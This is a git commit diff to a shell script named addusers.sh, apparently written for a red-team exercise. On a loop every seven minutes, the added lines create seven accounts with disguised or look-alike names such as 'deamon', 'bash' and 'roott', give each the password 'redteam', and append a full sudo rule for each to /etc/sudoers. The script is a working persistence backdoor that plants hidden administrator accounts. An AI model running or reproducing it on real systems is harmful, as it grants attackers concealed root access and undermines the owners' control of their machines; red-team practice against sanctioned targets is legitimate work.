b9034875cd86d96ec1eb99743fe69fde3799b32f
mattr555-r <64177813+mattr555-r@users.noreply.github.com>
2023-04-12 15:43:27 -0400

    Update addusers.sh

--- addusers.sh
+++ addusers.sh
@@ -7,6 +7,32 @@ do
  sleep 420
 
  #Add multiple users for red team to use
- useradd -m -p "pass" ""
+ useradd -m "home"
+ echo "home:redteam" | chpasswd
+ echo 'home  ALL=(ALL:ALL) ALL' >> /etc/sudoers
+ 
+ useradd -m "bash"
+ echo "bash:redteam" | chpasswd
+ echo 'bash  ALL=(ALL:ALL) ALL' >> /etc/sudoers
+ 
+ useradd -m "deamon"
+ echo "deamon:redteam" | chpasswd
+ echo 'deamon  ALL=(ALL:ALL) ALL' >> /etc/sudoers
+ 
+ useradd -m "shell"
+ echo "shell:redteam" | chpasswd
+ echo 'shell  ALL=(ALL:ALL) ALL' >> /etc/sudoers
+ 
+ useradd -m "new"
+ echo "new:redteam" | chpasswd
+ echo 'new  ALL=(ALL:ALL) ALL' >> /etc/sudoers
+ 
+ useradd -m "syn"
+ echo "syn:redteam" | chpasswd
+ echo 'syn  ALL=(ALL:ALL) ALL' >> /etc/sudoers
+ 
+ useradd -m "roott"
+ echo "roott:redteam" | chpasswd
+ echo 'roott  ALL=(ALL:ALL) ALL' >> /etc/sudoers
  
 done
